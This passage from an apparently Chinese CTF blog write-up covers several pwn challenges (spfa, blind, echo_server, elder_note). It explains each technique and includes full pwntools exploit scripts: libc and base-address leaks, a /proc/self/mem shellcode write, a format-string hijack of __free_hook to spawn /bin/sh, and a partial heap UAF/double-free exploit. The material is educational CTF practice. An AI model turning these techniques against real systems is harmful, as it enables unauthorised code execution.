class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line">io=process(<span class="string">&quot;./spfa&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;chuj.top&quot;,47250)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;spfa&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"><span class="comment">#brute()</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;datas?\n&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get libc_base</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-((elf.sym[<span class="string">&quot;dist&quot;</span>]-elf.got[<span class="string">&quot;setbuf&quot;</span>])//<span class="number">8</span>)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">setbuf=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get proc_base</span></span><br><span class="line">_fini_array=<span class="number">0x6D28</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-(elf.sym[<span class="string">&#x27;dist&#x27;</span>]-_fini_array)//<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">proc_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">10</span>)-<span class="number">0x12e0</span></span><br><span class="line">log.success(<span class="string">&quot;proc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get env_stack</span></span><br><span class="line">envir=libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">dist=proc_base+elf.sym[<span class="string">&quot;dist&quot;</span>]</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>((envir-dist)//<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">env_stack=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">log.success(<span class="string">&quot;env_stack===&gt;&quot;</span>+<span class="built_in">hex</span>(env_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#write ret_addr</span></span><br><span class="line">ret_id=(env_stack-<span class="number">0x100</span>-dist)//<span class="number">8</span></span><br><span class="line">backdoor=proc_base+<span class="number">0x16AA</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">&quot;0 &quot;</span>+<span class="built_in">str</span>(ret_id)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(backdoor))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><p>题目质量都好高，但这几天打这个比赛都没复习高数了，之后的 week 题就不打了，但要复盘。</p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h3><p>一道盲打题，首先告诉了我们 write 的 libc 地址，我们便能利用<code>LibcSearcher</code>获取 libc。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/220601/13/24783/19717/63c7ae06F70f2d582/3bd0aaa0971b77d5.png" style="zoom:80%;" /><p>然后程序告诉我们可以打开一个文件，这里需要我们了解一个新的知识点：Linux 内核提供了一种通过 <strong>/proc</strong> 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc 文件系统是一个<strong>伪文件</strong>系统，它只存在内存当中，而不占用外存空间。读取 <strong>/proc/self/maps</strong> 可以得到当前进程的<strong>内存映射关系</strong>，通过读该文件的内容可以<strong>得到内存代码段基址</strong>。<span style='color:red;font-weight:550'>/proc/self/mem</span> 是进程的内存内容，<strong>通过修改该文件相当于直接修改当前进程的内存</strong>。该文件不能直接读取，需要结合 maps 的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p><p>程序给了我们<code>libc基址</code>，因此我们只需打开<code>/proc/self/mem</code>文件，打开后，程序让我们输入一个地址进行篡改，因为 main 函数 ret 时返回的是<code>__libc_start_main</code>，因此我们篡改该内存即可（<strong>直接写内存绕开了 libc 文件不可写的防护</strong>）。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/7080/30/21758/7849/63c7ae0bF0edbfbdf/eb5364df131c83a0.png" style="zoom:80%;" /><p>但因为 main 函数 <strong>ret 的是 libc_start_main+???</strong> 而不是 libc_start_main+0，所以我们需要足够多的 nop 来覆盖到 libc_start_main+???，令其滑倒在 shellcode 上。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">51916</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line">brute()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;: 0x&#x27;</span>)</span><br><span class="line">write=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base=write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base===&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__libc_start_main=libc_base+libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;/proc/self/mem\x00&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(__libc_start_main))</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh()).rjust(<span class="number">0x300</span>,asm(<span class="string">&#x27;nop&#x27;</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo_server"></a>echo_server</h3><p>在堆上构造栈的 fmt 链子的题目，总算有机会复盘一遍了，确实麻烦。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/38973/13/22033/28494/63c7aeacFa044f73d/7945680aac3fdbbe.png" style="zoom:80%;" /><p>程序逻辑很简单，就是一个不断循环的格式化字符串漏洞。</p><p>首先我们动调看一下栈的结构：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/184800/16/30987/103139/63c7aeacF807096d0/dac72b77454e61c7.png" style="zoom:80%;" /><p>通过格式化字符串我们可以泄露出<code>rbp</code>和<code>libc</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%6$p-%13$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(rbp)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br></pre></td></tr></table></figure><p>因为 realloc 的<code>size</code>位为 0 时等同于 free，因此接下来我们选择在栈上构造 __free_hook。</p><p>如何构造就需要用到 rbp 链了：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/8746/26/21445/113047/63c7aeadF796627ad/e564dde984db2034.png" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main_in_stack=(rbp &amp; <span class="number">0xFF</span>)+<span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_in_stack:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_in_stack))</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack+<span class="number">2</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><p>此时我们选择先构造中间俩字节，所以将 rbp 修改为<code>目标地址+2</code>处</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32370/12/20382/52439/63c7aeafF1f410f93/36d22f9cd324267d.png" style="zoom:80%;" /><p>然后我们利用格式化字符串，将 rbp 指向处写入 __free_hook 对应的 2 个字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>((__free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/181181/27/31734/49453/63c7aeaeF8db3bcc9/9774a07007e1c680.png" style="zoom:80%;" /><p>重复上述步骤我们同理可以修改最后两个字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/63189/30/23701/56144/63c7af8cFe4ad12d6/d1e9b4b51c1f0698.png" style="zoom:80%;" /><p>这样我们在栈上就有了<code>__free_hook</code>，重复上述步骤，通过利用当前 rbp 修改写入位置，我们便能将<code>__free_hook</code>劫持为<code>system</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">2</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">4</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+4=&gt;(system &gt;&gt; 32) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/63189/30/23701/56144/63c7af8cFe4ad12d6/d1e9b4b51c1f0698.png" style="zoom:80%;" /><p>完整 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="comment">#get libc &amp; rbp</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%6$p-%13$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(rbp)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">__libc_start_main_in_stack=(rbp &amp; <span class="number">0xFF</span>)+<span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_in_stack:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_in_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp1=&gt;rbp2</span></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main+2</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack+<span class="number">2</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main+2</span></span><br><span class="line"><span class="comment">#__libc_start_main+2=(__free_hook &gt;&gt; 16) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>((__free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp1=&gt;rbp2</span></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main</span></span><br><span class="line"><span class="comment">#__libc_start_main+0=__free_hook &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"><span class="comment">#now original __libc_start_main_in_stack = __free_hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__free_hook+0=&gt;(system) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__free_hook</span></span><br><span class="line"><span class="comment">#__free_hook=__free_hook+2</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">2</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+2=&gt;(system &gt;&gt; 16) &amp; 0xFFFF</span></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__free_hook+2</span></span><br><span class="line"><span class="comment">#__free_hook+2=__free_hook+4</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">4</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+4=&gt;(system &gt;&gt; 32) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"><span class="comment">#now free_hook =&gt; system</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="elder-note"><a href="#elder-note" class="headerlink" title="elder_note"></a>elder_note</h3><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/129636/40/34283/6010/63c7b2c5F9c8406a8/c2b2fed3e7319002.png" style="zoom:80%;" /><p>libc2.23 下的 <strong>UAF</strong>，最大可申请 0x100 大小的 chunk，所以通过 unsorted bin leak 便能泄露出 libc。通过 double free 将 chunk 分配到<code>&amp;_malloc_hook-0x23</code>处。但因为无法满足 one_gadget 的条件，所以配合<code>&amp;_realloc_hook</code> 调整栈帧，即将<code>&amp;_malloc_hook</code>劫持为<code>&amp;realloc+?</code>，再将<code>&amp;_realloc_hook</code>劫持为 one_gadget。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">0x100</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x1</span>, <span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x2</span>, <span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line"></span><br><span 